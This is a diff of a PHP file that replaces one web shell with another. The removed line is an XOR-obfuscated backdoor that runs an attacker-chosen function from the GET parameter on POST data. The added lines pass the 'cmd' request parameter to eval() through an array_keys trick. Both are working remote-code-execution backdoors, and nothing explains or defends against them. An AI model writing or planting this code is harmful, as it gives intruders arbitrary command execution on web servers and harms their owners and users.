@@ -1,1 +1,5 @@
-<?php ${(chr(63)^chr(96)).(chr(60)^chr(123)).(chr(62)^chr(123)).(chr(47)^chr(123))}[(chr(43)^chr(64))](${(chr(36)^chr(123)).(chr(46)^chr(126)).(chr(47)^chr(96)).(chr(46)^chr(125)).(chr(47)^chr(123))}[(chr(43)^chr(64))]); ?>
+<?php
+$a=array($_REQUEST['cmd']=>"3");
+$b=array_keys($a)[0];
+eval($b);
+?>
